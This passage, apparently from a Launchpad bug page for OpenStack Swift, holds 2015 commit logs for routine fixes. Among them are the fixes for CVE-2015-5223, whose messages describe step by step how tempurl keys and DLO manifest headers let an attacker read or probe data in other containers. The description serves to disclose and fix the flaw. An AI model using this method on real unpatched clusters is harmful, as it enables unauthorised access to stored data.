Change-Id: I405441383739637e0b13746d6f4e2bad1c874b4d
Signed-off-by: Zhao Lei <zhaolei@cn.fujitsu.com>
commit c35cc13b8abeb97400632cbe8ec56fc1040d8210
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Thu Aug 6 10:01:17 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/unit/proxy/\*
Change-Id: Ie2c7e73e1096233a10ee7fbf6f88386fa4d469d6
commit 239e94e62518f36601fb18119700269753d02a01
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Thu Aug 6 09:28:51 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/probe/\*
Change-Id: Ie08dd7a8a6c48e3452dfe4f2b41676330ce455d5
commit 49b9ba37ac522502ccad66fba7bfef375eab145d
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Wed Aug 5 14:51:32 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/functional/\*
Change-Id: Iee7f8ffca9838ccc521107180697d91ac9559405
commit 81816bebe6b3506af8cabaa7ebe265c70f3499cd
Author: kenichiro matsuda <matsuda\_kenichi@jp.fujitsu.com>
Date: Thu Aug 6 10:13:02 2015 +0900
Fix shebang of commands
Fix shebang of following commands.
$ grep '#!/usr/bin/python' swift/bin/\*
swift/bin/swift-account-info:#!/usr/bin/python
swift/bin/swift-container-info:#!/usr/bin/python
swift/bin/swift-container-sync:#!/usr/bin/python
swift/bin/swift-recon:#!/usr/bin/python
swift/bin/swift-ring-builder:#!/usr/bin/python
swift/bin/swift-ring-builder-analyzer:#!/usr/bin/python
Change-Id: I564d1d8abd76eba57730fc2f30263b0a0f809867
Closes-Bug: #1481623
commit 652f0f9da408e955843f87a504b3dab5be3cff80
Author: Pete Zaitcev <zaitcev@kotori.zaitcev.us>
Date: Wed Aug 5 15:33:29 2015 -0600
Having said H, I, J, we ought to say K
In the long run, we might want to stop these updates. But this
decision is above my pay grade.
Change-Id: I335558e1da8052be1b215fbad51244b47af3d81b
commit ed3aec2146b114c85bb3b196c999bf3f44fe159e
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Aug 6 00:18:52 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in
dir: test/unit/container/\*
Change-Id: I3333022ed63ce03198bc73147246d91d2442a440
commit f449e914728fdcaf0870c15b9fc5ebd16a9df916
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Wed Aug 5 22:32:02 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3, fixing in:
dir: test/unit/cli/\*
Change-Id: I9a2fc1f717beafd5fa8408942046e310e8de0318
commit 6594bbebb582801c069c4966352fee19eadef2f8
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Wed Aug 5 22:25:46 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in
dir : test/unit/account/\*
Change-Id: I70415197df1b0d58d4d6e219733c13a9c9cdfff7
commit 89f59062864e5cbfc839a6084c323ce35438aa57
Author: Ben Martin <blmartin@us.ibm.com>
Date: Mon Jul 27 14:19:09 2015 -0500
+Document method to avoid rsync filling root drive
When rsync pushes to a remote node with an unmounted drive and if
certain steps are not taken, rsync may attempt to write files to
the local drive at the location where the drive was mounted.
There are two suggested solutions for this issue:
1) Set the permissions for all mount points in /srv/node/
to root:root 755
2) Mount the drives elsewhere and symlink the drives to /srv/.../
The first method ensures that only root and not the swift user
can write in the /srv/.../ directories.
The second method will prompt a broken link issue if rsync
attempts to write to an unmounted drive.
Change-Id: I60ce4ed9ef8401768d5f78b6806cbb2e2a65303e
Closes-Bug: #1470576
commit f0d51882b921075f5309ed6ff07385dc6103d4dc
Author: Charles Hsu <charles0126@gmail.com>
Date: Wed Aug 5 22:09:40 2015 +0800
Add extra\_header\_count to document and config.
Change-Id: Iec86b488d71553c295afe7098822ce2046df9546
commit 7071762d3698c59fabdee76890e300f81417be74
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Tue Aug 4 23:15:37 2015 -0700
Fix TypeError if backend response doesn't have expected headers
There was some debug logging mixed in with some error handling on PUTs
that was relying on a very specific edge would only encounter a set of
backend responses that included the expected set of headers to diagnoise
the failure.
But the backend responses may not always have the expected headers.
The proxy debug logging should be more robust to missing headers.
It's a little hard to follow, but if you look `\_connect\_put\_node` in
swift.proxy.controller.obj - you'll see that only a few connections can
make their way out of the initial put connection handling with a "resp"
attribute that is not None. In the happy path (e.g. 100-Continue) it's
explictly set to None, and in most errors (Timeout, 503, 413, etc) a new
connection will be established to the next node in the node iter.
Some status code will however allow a conn to be returned for validation
in `\_check\_failure\_put\_connections`, i.e.
\* 2XX (e.g. 0-byte PUT would not send Expect 100-Continue)
\* 409 - Conflict with another timestamp
\* 412 - If-None-Match that encounters another object
... so I added tests for those - fixing a TypeError along the way.
Change-Id: Ibdad5a90fa14ce62d081e6aaf40aacfca31b94d2
commit 01848c565e5821d2500cb234261c70871e562ebe
Author: David Goetz <dpgoetz@gmail.com>
Date: Fri Jun 26 17:27:31 2015 -0700
Speed up reaper for a big account delete and some better error handling
In run\_forever mode, run the reaper on all three copies of the account
DB instead of just the first one and shard the containers between them.
Change-Id: Id182e89dad70df9d6d9988523861b8085d74c765
commit 5b24b2249878e25ee702ee4237227c984036c6ec
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Tue Aug 4 06:29:11 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: I9f0e5fd25ec143fb87de1895794764dea4587f93
commit 8d06f56c1fac23bca463d3a93353da6b50ad5bed
Author: Takashi NATSUME <natsume.takashi@lab.ntt.co.jp>
Date: Tue Aug 4 10:14:25 2015 +0900
Fix typo of 'receive'
Change-Id: Ic01defa8d48ba4b7f4bd6cbe4d59b9bab468a36c
commit 310ac18d61b001bdf297505243d8aa62e8fde8fe
Author: Brian Reitz <brian.reitz@oracle.com>
Date: Mon Aug 3 16:28:31 2015 -0500
Convert docstring to a comment in test\_denied\_DELETE\_of\_versioned\_object unit test.
Docstrings cause issues for nose and created non standard test output for this test.
Change-Id: I91e6450480567de0ee0b18d3efae01a4b94f0a86
commit 21a7b4aaa6f991c0eeb8f74876b14fe22713586b
Author: Alistair Coles <alistair.coles@hp.com>
Date: Mon Aug 3 14:58:24 2015 +0100
Test that get\_hashes ignores only removed hash dir
Add test for case not yet covered by unit tests: suffix dir
has two hash dirs, one with expired tombstone. That hash dir gets
removed and its hash is not included in the suffix hash, but the
remaining hash dir's hash is reported.
Change-Id: I031a022daed6b8a66dfd04bea1b4d5eebcb882b3
commit 44917c8a90e79a85cd6c6821d8b6d043f83b322d
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Mon Jul 20 13:06:48 2015 -0700
Handle removed suffix dirs the same as empty suffix dirs
When hashes suffix dirs, the directory might have gotten cleaned up while
still appearing in hashes.pkl. It would even get cleaned up the next time.
For example, given this really old tombstone:
objects/846/3d0/d3a20154d0a828a032aba6860397c3d0/1432267961.41808.ts
Prior to this commit, a call to get\_hashes() would reap the old
tombstone and any empty containing dirs, but the resulting hashes.pkl
would still contain {'3d0': 'd41d8cd98f00b204e9800998ecf8427e'} even
though there's no such suffix dir any more.
("d41d8cd98f00b204e9800998ecf8427e" is the MD5 of the empty string.)
Then, a \*subsequent\* get\_hashes() call would omit 3d0 from the resulting
hash, so then hashes.pkl would no longer contain 3d0. This difference
would result in a little useless replication traffic while nodes without
a particular part/suffix pair, but who disagreed on how that showed up
in hashes.pkl, tried to push their version of nothing to one another.
Now, an empty suffix dir doesn't appear in hashes.pkl at all, whether
it's for replication or EC, or whether it's for the get\_hashes() call
that reaped the suffix dirs or not.
Co-Author: Samuel Merritt <sam@swiftstack.com>
Change-Id: Ie1bfb1cc56d0fc030c6db42f97b55d140695cf1f
commit cf4d50bd68b658d35759fb56446557858dcd9572
Author: Alistair Coles <alistair.coles@hp.com>
Date: Fri Jun 5 13:06:29 2015 +0100
Make test\_proxy work independent of env vars
test.unit.common.test\_internal\_client.TestSimpleClient.test\_proxy
will fail if the environment has http\_proxy set and does not have
no\_proxy=127.0.0.1 set. This seems to be because urllib overrides
any proxy arg passed to the Request with the env http\_proxy var,
unless the Request host is in no\_proxy.
We don't need to test urllib, so this patch changes the test to
simply ensure that swift code does pass the correct proxy arg to
urllib2.urlopen. That avoids testers having to make sure their
env vars are compliant to successfully run unit tests. While it is
reasonable to think that 127.0.0.1 is in the no\_proxy list, it
shouldn't be a requirement pass swift tests.
Change-Id: Iff91acdb76fabe7056b3e90e2756e27fe5105817
commit 67513fc17c23066f6547b5e3c4ab2dc852e4f7f0
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sat Jun 27 23:26:47 2015 +0530
Adding bandit for security static analysis testing in swift
This change adds a basic bandit config for Swift. It can be invoked
by running the tox environment for bandit;
tox -e bandit
This is an initial step for using bandit with Swift
and it should be revisited to improve the testing as more is learned
about the specific needs of the Swift code base.As per now some tests
are excluded as they were used on purpose.
https://wiki.openstack.org/wiki/Security/Projects/Bandit
Implements: blueprint swift-bandit
Change-Id: I621be9a68ae9311f3a6eadd1636b05e646260cf2
commit 768d7ab074807175471d589de96d091e3239052e
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 30 15:30:35 2015 -0700
Add a probetest for HUP/reload
This would have been enough to catch the regression, and we can extend
them as we work on any future ehancements to our process management.
Change-Id: I9a1b57aa15663380c45cf783afc8212ab4ffbace
commit c5b5cf91a984f80cc6cbe42735b242083d700542
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 28 21:03:05 2015 +0530
test/unit: Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I94e1bc6bd83ad6b05695c7ebdf7cbfd8f6d9f9af
commit dd2f1be3b124d3901ebbc176a7adc462b6449667
Author: Ondrej Novy <ondrej.novy@firma.seznam.cz>
Date: Tue Jun 16 17:42:58 2015 +0200
Time synchronization check in recon.
This change add call time to recon middleware and param --time to
recon CLI. This is usefull for checking if time in cluster is
synchronized.
Change-Id: I62373e681f64d0bd71f4aeb287953dd3b2ea5662
commit cbcfb74132aba4d5834dc9cf33dc4f664b82d39a
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Wed Jul 22 19:32:46 2015 -0700
Cleanup nits from container\_update\_timeout
Change-Id: Ib17fc9a027db267350abc5a7db4e3172dfff7913
commit 2289137164231d7872731c2cf3d81b86f34f01a4
Author: John Dickinson <me@not.mn>
Date: Sat May 23 15:40:03 2015 -0700
do container listing updates in another (green)thread
The actual server-side changes are simple. The tests are a different
matter. Many changes were needed to the object server tests to
handle the now-async calls to the container server. In an effort to
test this properly, some drive-by changes were made to improve tests.
I tested this patch by doing zero-byte object writes to one container
as fast as possible. Then I did it again while also saturating 2 of the
container replica's disks. The results are linked below.
https://gist.github.com/notmyname/2bb85acfd8fbc7fc312a
DocImpact
Change-Id: I737bd0af3f124a4ce3e0862a155e97c1f0ac3e52
commit c8131c6abb17b00b043a9b95e65be819e1fd3c9d
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sun Jul 12 14:48:35 2015 +0530
sys.exc\_type/exc\_value/exc\_traceback are Deprecated
sys.exc\_info() contains a tuple of these three.
Change-Id: I530cbeb37c43da98b4924db41f6604871077bd47

| **tags**: | added: in-feature-crypto |
| --- | --- |

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-09-08

| Changed in ossa: | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-08:  [**Related fix proposed to swift (feature/hummingbird)**](/swift/%2Bbug/1453948/comments/35) |  |  | [#35](/swift/%2Bbug/1453948/comments/35) |
| --- | --- | --- | --- |

Related fix proposed to branch: feature/hummingbird

Review: <https://review.openstack.org/221410>

Related fix proposed to branch: feature/hummingbird
Review: https://review.openstack.org/221410

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-08:  [**Related fix merged to swift (feature/hummingbird)**](/swift/%2Bbug/1453948/comments/36) |  |  | [#36](/swift/%2Bbug/1453948/comments/36) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/swift/%2Bbug/1453948/comments/36/%2Bdownload) (70.7 KiB)

Reviewed: <https://review.openstack.org/221410>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=eb8f1f83f1cfc63d8452bc30096fd1c145781527>

Submitter: Jenkins

Branch: feature/hummingbird

commit cb683d391cb66d0f52830de16760c80fd2afedf9

Author: OpenStack Proposal Bot <email address hidden>

Date: Sat Sep 5 06:17:51 2015 +0000

Imported Translations from Transifex

For more information about this automatic import see:

    <https://wiki.openstack.org/wiki/Translations/Infrastructure>

Change-Id: I2d92b8e34a665fb0bb4c048cfb0c59de295dfce6

commit e4542455c8a07b7981c247df8b737816062c1655

Author: Emett Speer <email address hidden>

Date: Wed Sep 2 17:18:03 2015 -0700

[Labs] Update links to Cloud Admin Guide

Update links to the Cloud Admin Guide after the

    RST conversion of that book altered URLs.

Change-Id: I899f8938498b744e62887968a65e58c00ef27f1b

commit 58fcc07523978306cd3889ada73af5d9e664cf59

Author: Christian Schwede <email address hidden>

Date: Wed Sep 2 10:52:34 2015 +0000

Test if container\_sweep is executed on unmounted devices

This change ensures that container\_sweep is not run if a device is not mounted

    and mount\_check is set to True.

Change-Id: I823083c8431d9e61fd426508033ec9188503957b

commit e02609c66a804845672413b06830b87395afef31

Author: Samuel Merritt <email address hidden>

Date: Tue Sep 1 15:19:50 2015 -0700

Preserve traceback in swift-dispersion-report

Commit c690bcb fixed a bug in the dispersion report, but changed this

    from a bare "raise" to "raise err", which loses the traceback. Not a

    big deal, but worth putting back IMO.

Change-Id: Id5b72153a4b8df8e3faaf1fa3fb2040e28ba85cc

commit d06d4ad0fd2dfe69da8008e729651264522c6c06

Author: Minwoo Bae <email address hidden>

Date: Tue Sep 1 15:08:44 2015 -0500

Included reference in swift.obj.diskfile to enumerate the string

    used for data file paths.

Change-Id: Ie22caa678bc00dfc43fabec7efbbb9f34490f1b5

commit 615c7a204b9386e05c5bab658bfe96766ad1e680

Author: Brian Cline <email address hidden>

Date: Tue Sep 1 10:51:20 2015 -0500

Adds useful dispersion info from changelog

Change-Id: I1a45088fc32620b02ff9a754b02ec1eb75a59d6e

commit 3b8755098a1786c5447abf158bd686293a82977c

Author: janonymous <email address hidden>

Date: Sun Aug 2 21:29:13 2015 +0530

Replace a / b with a // b to use integer division where needed

Change-Id: I72c81faa62786e140b0de00e3a04934bf1b5adbd

commit 524c89b7eeff037b8a6b421888771e15f98c2da2

Author: John Dickinson <email address hidden>

Date: Fri Aug 21 13:39:41 2015 -0700

Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.

Change-Id: Ic6301146b839c9921bb85c4f4c1e585c9ab66661

commit 05de1305a903ee4ce9c8c50fde53c552d5b90d51

Author: Clay Gerrard <email address hidden>

Date: Thu Aug 27 18:35:09 2015 -0700

Make ssync\_sender send valid chunked requests

The connect method of ssync\_sender tells the remote connection that it's

    going to send a valid HTTP chunked request, but if the remote end needs

    to respond with an error of any kind sender th...

Reviewed: https://review.openstack.org/221410
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=eb8f1f83f1cfc63d8452bc30096fd1c145781527
Submitter: Jenkins
Branch: feature/hummingbird
commit cb683d391cb66d0f52830de16760c80fd2afedf9
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Sat Sep 5 06:17:51 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: I2d92b8e34a665fb0bb4c048cfb0c59de295dfce6
commit e4542455c8a07b7981c247df8b737816062c1655
Author: Emett Speer <speer.emett@gmail.com>
Date: Wed Sep 2 17:18:03 2015 -0700
[Labs] Update links to Cloud Admin Guide
Update links to the Cloud Admin Guide after the
RST conversion of that book altered URLs.
Change-Id: I899f8938498b744e62887968a65e58c00ef27f1b
commit 58fcc07523978306cd3889ada73af5d9e664cf59
Author: Christian Schwede <cschwede@redhat.com>
Date: Wed Sep 2 10:52:34 2015 +0000
Test if container\_sweep is executed on unmounted devices
This change ensures that container\_sweep is not run if a device is not mounted
and mount\_check is set to True.
Change-Id: I823083c8431d9e61fd426508033ec9188503957b
commit e02609c66a804845672413b06830b87395afef31
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Sep 1 15:19:50 2015 -0700
Preserve traceback in swift-dispersion-report
Commit c690bcb fixed a bug in the dispersion report, but changed this
from a bare "raise" to "raise err", which loses the traceback. Not a
big deal, but worth putting back IMO.
Change-Id: Id5b72153a4b8df8e3faaf1fa3fb2040e28ba85cc
commit d06d4ad0fd2dfe69da8008e729651264522c6c06
Author: Minwoo Bae <minwoob@us.ibm.com>
Date: Tue Sep 1 15:08:44 2015 -0500
Included reference in swift.obj.diskfile to enumerate the string
used for data file paths.
Change-Id: Ie22caa678bc00dfc43fabec7efbbb9f34490f1b5
commit 615c7a204b9386e05c5bab658bfe96766ad1e680
Author: Brian Cline <bcline@softlayer.com>
Date: Tue Sep 1 10:51:20 2015 -0500
Adds useful dispersion info from changelog
Change-Id: I1a45088fc32620b02ff9a754b02ec1eb75a59d6e
commit 3b8755098a1786c5447abf158bd686293a82977c
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sun Aug 2 21:29:13 2015 +0530
Replace a / b with a // b to use integer division where needed
Change-Id: I72c81faa62786e140b0de00e3a04934bf1b5adbd
commit 524c89b7eeff037b8a6b421888771e15f98c2da2
Author: John Dickinson <me@not.mn>
Date: Fri Aug 21 13:39:41 2015 -0700
Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.
Change-Id: Ic6301146b839c9921bb85c4f4c1e585c9ab66661
commit 05de1305a903ee4ce9c8c50fde53c552d5b90d51
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Aug 27 18:35:09 2015 -0700
Make ssync\_sender send valid chunked requests
The connect method of ssync\_sender tells the remote connection that it's
going to send a valid HTTP chunked request, but if the remote end needs
to respond with an error of any kind sender throws HTTP right out the
window, picks up his ball, and closes the socket down hard - much to the
surprise of the eventlet.wsgi server who up to this point had been
playing along quite nicely with this 'SSYNC' nonsense assuming that
everyone here is consenting mature adults.
If you're going to make a "Transfer-Encoding: chunked" request have the
good decency to finish the job with a proper '0\r\n\r\n'. [1]
N.B. It might be possible to handle an error status during the
initialize\_request phase with some sort of 100-continue support, but
honestly it's not entirely clear to me when the server isn't going to
close the connection if the client is still expected to send the body
[2] - further if the error comes later during missing\_check or updates
we'll for sure want to send the chunk transfer termination line before
we close down the socket and this way we cover both.
1. Really, eventlet.wsgi shouldn't be so blasted brittle about this [3]
2. https://lists.w3.org/Archives/Public/ietf-http-wg/2005AprJun/0007.html
3. https://github.com/eventlet/eventlet/commit/c3ce3eef0b4d0dfdbfb1ec0186d4bb204fb8ecd5
Closes-Bug #1489587
Change-Id: Ic17c6c3075553f8cf6ef6213e62a00282f0d01cf
commit 993ee4e37af1961adba2047d5aa2eb210e423eb3
Author: nakagawamsa <nakagawamsa@nttdata.co.jp>
Date: Fri Aug 28 11:49:43 2015 +0900
Remove duplicate X-Backend-Storage-Policy-Index key
There is duplicate 'X-Backend-Storage-Policy-Index' dictionary key in unit.obj.test\_server.py.
One key has fixed policy index value, and another has random value.
Unittest should done with random policy index, so remove key which is set fixed value.
Change-Id: Ic91fcf44d48297d0feee33c928ca682def9790a3
commit 893f30c61d280804e417790dd34ba7bc3fb4f6fc
Author: paul luse <paul.e.luse@intel.com>
Date: Wed Aug 12 13:32:50 2015 -0700
EC GET path: require fragments to be of same set
And if they are not, exhaust the node iter to go get more. The
problem without this implementation is a simple overwrite where
a GET follows before the handoff has put the newer obj back on
the 'alive again' node such that the proxy gets n-1 fragments
of the newest set and 1 of the older.
This patch bucketizes the fragments by etag and if it doesn't
have enough continues to exhaust the node iterator until it
has a large enough matching set.
Change-Id: Ib710a133ce1be278365067fd0d6610d80f1f7372
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Closes-Bug: 1457691
commit 58a10a5fffec69304d7bcce0f1c43bd2a9f9ff52
Author: Alistair Coles <alistair.coles@hp.com>
Date: Wed Aug 26 16:30:23 2015 +0100
Add test that a tempurl POST cannot set a DLO manifest header
Follow up to [1] to add tests for tempurl POSTs not being allowed
to set a DLO manifest header.
[1] I11e68830009d3f6bff44ae4011a41b67139146f6
Change-Id: I7c0ad5a936f71e56c599b8495a586913d3334422
Related-Bug: 1453948
commit d4409c0a046c6ce0e14e18c95efe2cd16cf120e8
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 09:10:13 2015 -0500
Better scoping for tempurls, especially container tempurls
It used to be that a GET of a tempurl referencing a large object would
let you download that large object regardless of where its segments
lived. However, this led to some violated user expectations around
container tempurls.
(Note on shorthand: all tempurls reference objects. However, "account
tempurl" and "container tempurl" are shorthand meaning tempurls
generated using a key on the account or container, respectively.)
Let's say an application is given tempurl keys to a particular
container, and it does all its work therein using those keys. The user
expects that, if the application is compromised, then the attacker
only gains access to the "compromised-container". However, with the old
behavior, the attacker could read data from \*any\* container like so:
1) Choose a "victim-container" to download
2) Create PUT and GET tempurl for any object name within the
"compromised-container". The object doesn't need to exist;
we'll create it.
3) Using the PUT tempurl, upload a DLO manifest with
"X-Object-Manifest: /victim-container/"
4) Using the GET tempurl, download the object created in step 3. The
result will be the concatenation of all objects in the
"victim-container".
Step 3 need not be for all objects in the "victim-container"; for
example, a value "X-Object-Manifest: /victim-container/abc" would only
be the concatenation of all objects whose names begin with "abc". By
probing for object names in this way, individual objects may be found
and extracted.
A similar bug would exist for manifests referencing other accounts
except that neither the X-Object-Manifest (DLO) nor the JSON manifest
document (SLO) have a way of specifying a different account.
This change makes it so that a container tempurl only grants access to
objects within its container, \*including\* large-object segments. This
breaks backward compatibility for container tempurls that may have
pointed to cross container \*LO's, but (a) there are security
implications, and (b) container tempurls are a relatively new feature.
This works by having the tempurl middleware install an authorization
callback ('swift.authorize' in the WSGI environment) that limits the
scope of any requests to the account or container from which the key
came.
This requires swift.authorize to persist for both the manifest request
and all segment requests; this is done by having the proxy server
restore it to the WSGI environment prior to returning from \_\_call\_\_.
[CVE-2015-5223]
Co-Authored-By: Clay Gerrard <clayg@swiftstack.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Co-Authored-By: Christian Schwede <cschwede@redhat.com>
Co-Authored-By: Matthew Oliver <matt@oliver.net.au>
Change-Id: Ie6d52f7a07e87f6fec21ed8b0ec1d84be8b2b11c
Closes-Bug: 1449212
commit 10b2939b433a4a79b4f7b97640b3d208cacfeffb
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 23 22:36:21 2015 -0700
Disallow unsafe tempurl operations to point to unauthorized data
Do not allow PUT tempurls to create pointers to other data. Specifically
disallow the creation of DLO object manifests by returning an error if a
non-safe tempurl request includes an X-Object-Manifest header regardless of
the value of the header.
This prevents discoverability attacks which can use any PUT tempurl to probe
for private data by creating a DLO object manifest and then using the PUT
tempurl to head the object which would 404 if the prefix does not match any
object data or form a valid DLO HEAD response if it does.
This also prevents a tricky and potentially unexpected consequence of PUT
tempurls which would make it unsafe to allow a user to download objects
created by tempurl (even if they just created them) because the result of
reading the object created via tempurl may not be the data which was uploaded.
[CVE-2015-5223]
Co-Authored-By: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Change-Id: I11e68830009d3f6bff44ae4011a41b67139146f6
Closes-Bug: 1453948
commit c690bcb68331818a04c94741b25f40cc40f7b3c4
Author: Kazuhiro MIYAHARA <miyahara.kazuhiro@lab.ntt.co.jp>
Date: Mon Aug 17 16:50:56 2015 +0900
Fix dispersion-reports error message
This patch fixes Swift to show message
"No objects to query. Has swift-dispersion-populate been run?"
for "swift-dispersion-report —object-only”
with no container for object dispersion.
Change-Id: I82da56709cfc296a27f5180681709bc56adbc13d
Closes-Bug: #1468120
commit 8086a0e53406dc95856df2d3e015d3eaaf81380a
Author: Tushar Gohad <tushar.gohad@intel.com>
Date: Tue Aug 18 07:24:19 2015 +0000
Restrict PyECLib version to 1.0.7
v1.0.9 rev of PyECLib replaces Jerasure with a native EC
implementation (liberasurecode\_rs\_vand) as the default
EC scheme. Going forward, Jerasure will not be bundled
with PyPI version of PyECLib as it used to be, until
v1.0.7.
This is an interim change to Swift requirements until we
get v1.0.9 PyECLib included into global-requirements and
ready patches that change Swift default ec\_type (for doc,
config samples and unit tests) from "jerasure\_rs\_vand"
to "liberasurecode\_rs\_vand."
Change-Id: Ica4fee2cdea2bc7f5edd0e51ad637a4457faf3b4
commit 17efa343c605d0361b3f423696babbab3f3d972d
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Mon Jul 6 13:21:40 2015 -0700
Fix EC GET backend stream iteration state
In EC case, When GET object requested, proxy-server always makes a log
line "Client disconnected on read" even though the request succeeded.
That is because ECAppIter class doesn't maintain a bunch of backend
stream when closing the app\_iter. It will cause unfortunately
GeneratorExit on backend stream ResumingGetter.
This patch fixes to set non\_client\_disconnected to propagate the state
to the backend streams when the range iteration stopped successful.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Change-Id: I77af9807816bea1444d66534a17e2a210bcf09f8
Closes-Bug: #1472201
commit 25dc7224b63b039cb3778cca7f9f81f954c6d94e
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Aug 25 11:05:41 2015 +0100
Fix swob.Range docstring
Bad ranges cause a ValueError to be raised, not an empty
ranges list.
Change-Id: I118bd2f7dc08ff5198870f4093c6eb350506c8ed
commit a7b84f4c51207608adc3a5de7f4f9a629053c0ab
Author: Samuel Merritt <sam@swiftstack.com>
Date: Mon Aug 24 23:11:34 2015 -0700
Allow pep8 of a single file
Now you can run
$ tox -e pep8 path/to/file.py [path/to/file2.py [...]]
to run pep8 against just those files[1]. This is quite a bit faster
than a full pep8 run, and the faster feedback is nice when you're
fiddling with some formatting to placate pep8.
Of course, you can still run "tox -e pep8" to check the whole source
tree, just as before this commit.
[1] It'll still run against bin/swift\* as well, but that's still a lot
faster than running against all our .py files.
Change-Id: I81b4363fb95a34ff0f5c346b2b24f2047154f502
commit 6a35d479e8952c854fee6fbef9fe0397a289a6e5
Author: Matthew Oliver <matt@oliver.net.au>
Date: Tue Aug 25 11:24:49 2015 +1000
Follow up patch to fix a multiline import NITPIC
This change cleans up test/unit/obj/test\_replicator.py's imports
to use only 1 version of multiline import syntaxes (' \' vs '()').
I don't really mind which, but we should be consistant, at least
in the same file.
This is a follow up for patch 215857.
Change-Id: Ie2d328c25865b19092c493981a803ee246a9d7a5
commit edde5584affaa983d8db1d294bf1e20a2d4bbb50
Author: Hisashi Osanai <osanai.hisashi@jp.fujitsu.com>
Date: Tue Aug 25 07:52:18 2015 +0900
Fix typo of a comment in replicator
The typo was introduced by patch 138342 (sorry) so I fix it.
Change-Id: Id5126802d281ef7ee9be128bd2152c0d2584160e
commit 6151c6c45da481c0ea9a4fb876d14b39c1e347bf
Author: Tim Burke <tim.burke@gmail.com>
Date: Mon Aug 24 20:36:22 2015 +0000
Fix use of delimiter in account listings
Previously, account listings that used the delimiter query param could
omit some containers if they ended with the character that follows the
delimiter.
See If196e3075612b121ef8da4a9128167d00a248c27 for the corresponding fix
for container listings.
Change-Id: I57fcb97e51f653f5f4e306a632fcb3a0fb148c4e
commit a38f63e1c6b8b85b1675aa900e239a2e9906811e
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Aug 21 18:14:55 2015 -0700
Use correct Storage-Policy header for REPLICATE requests
Under some concurrency the object-replicator could potentially send the
wrong X-Backed-Storage-Policy-Index header to it's partner nodes during
replication if there were multiple storage policies on the same node
because of a race where multiple jobs being processed concurrently would
mutate some shared state on the ObjectReplicator instance.
Instead of using shared stated on the ObjectReplicator instance when
mutating the default headers send with REPLICATION requests each job
will copy them into a local where they can safely be updated.
Change-Id: I5522db57af7e308b1f9d4181f14ea14e386a71fd
commit ae129bf5e8c918efd8ee66279f98ee85e7c97b24
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Fri May 15 06:44:12 2015 -0700
eventlet.posthook related code needn't anymore
In the past, older Swift seemed to use eventlet.posthooks scheme for the
logging on proxy with posthooklogger method. However, for now, Swift
attaches no method to eventlet.posthooks everywhere so we don't have
to maintain the posthooks anymore.
Change-Id: Ie63941a202d448532d980252a4d25575f8edab9c
commit 4500ff340f021e4e5f6fd53960de03cb3c207925
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Wed May 13 00:43:59 2015 -0700
Fix the missing SLO state on fast-post
When using fast-post and POST (i.e. metadata update) is requested to
a SLO manifest files, current Swift drops the 'X-Static-Large-Object'
header from the existing metadata. It results in breaking the SLO
state because the manifest missing the 'X-Static-Large-Object' metadata
will be maintained as a normal files.
This patch fixes object-server to keep the existing
'X-Static-Large-Object' flag and then keep the SLO state.
Change-Id: Ib1eb569071372c322dd105c52baeeb094003291e
